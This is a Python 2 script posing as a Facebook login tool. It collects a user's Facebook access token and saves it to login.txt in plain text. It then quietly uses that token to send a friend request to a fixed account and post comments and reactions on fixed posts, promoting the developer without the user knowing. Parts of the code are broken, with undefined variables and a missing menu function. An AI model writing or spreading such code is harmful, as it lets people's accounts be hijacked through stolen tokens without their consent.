#!/usr/bin/python2
#coding=utf-8




import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """

       \033[1;91m_____    ____      __  __   _____ 
     \033[1;91m / ____|  / __ \    |  \/  | |_   _|
    \033[1;92m | (___   | |  | |   | \  / |   | |  
    \033[1;92m  \___ \  | |  | |   | |\/| |   | |  
    \033[1;95m  ____) | | |__| |   | |  | |  _| |_ 
    \033[1;95m |_____/   \____/    |_|  |_| |_____|
                                    
\033[1;92m❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛              
\033[1;91m➙DEVOLPER  :     SOMI AWAN
\033[1;96m➙WHATSAAP  :   03455453538
\033[1;93m➙NOTE  :   USE FAST INTERNET
\033[1;90m➙NOTE  :   USE 4 TO 6 GB RAM PHONE
\033[1;92m❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛         
         """
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(00000.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"


def login():
    os.system('clear')
    print logo
    jalan("\033[1;91mLOGIN ACCESS TOKEN FACEBOOK !!!")
    print 
    toket = raw_input("\033[1;97m{\033[1;91m?\033[1;97m} Token \033[1;91m:\033[1;97m ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\033[1;97m{\033[1;92m!\033[1;97m}\033[1;92m Login Success ! [Enjoy] '
    
	os.system('xdg-open https://www.facebook.com/profile.php?id=100041349421055')
        bot_komen ()
    except KeyError:
        print "\033[1;97m{\033[1;91m!\033[1;97m} \033[1;91mToken wrong !"
	time.sleep(1.7)
	login()
        
def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;39m[!] Token invalid'
        os.system('rm -rf login.txt')
    una = '100024540287354'
    kom = 'BRAND BOY'
    reac = 'BROKEN'
    post = '1050418732088069'
    post2 = '1050418732088069'
    kom2 =  'DASHING BOY'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


    
	

		
if __name__ == '__main__':
	login()



	
